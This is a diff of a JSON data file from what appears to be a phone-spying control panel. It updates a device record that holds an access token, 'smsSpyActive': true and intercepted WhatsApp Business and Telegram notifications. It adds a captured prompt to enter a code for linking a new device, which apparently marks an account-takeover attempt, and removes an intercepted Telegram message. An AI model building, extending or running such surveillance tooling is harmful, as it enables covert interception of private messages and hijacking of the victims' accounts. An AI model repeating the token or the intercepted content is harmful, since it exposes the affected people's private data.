@@ -311,7 +311,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775633506653,
+    "lastSeen": 1775633524682,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -327,6 +327,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WA Business",
+        "sender": "WhatsApp Business",
+        "content": "Masukkan kode untuk menautkan perangkat baru",
+        "time": "08/04 14:32",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775633527640
+      },
       {
         "appName": "WA Business",
         "sender": "Menghapus obrolan terpilih…",
@@ -4318,14 +4326,6 @@
         "time": "08/04 14:16",
         "pkg": "org.telegram.messenger.web",
         "receivedAt": 1775632572757
-      },
-      {
-        "appName": "Telegram",
-        "sender": "マ || !`𝙈𝙖𝙣𝙯𝙧𝙤𝙬𝙧 𝐓𝟓",
-        "content": "enggaa",
-        "time": "08/04 14:16",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775632572749
       }
     ],
     "galleryPhotos": [],
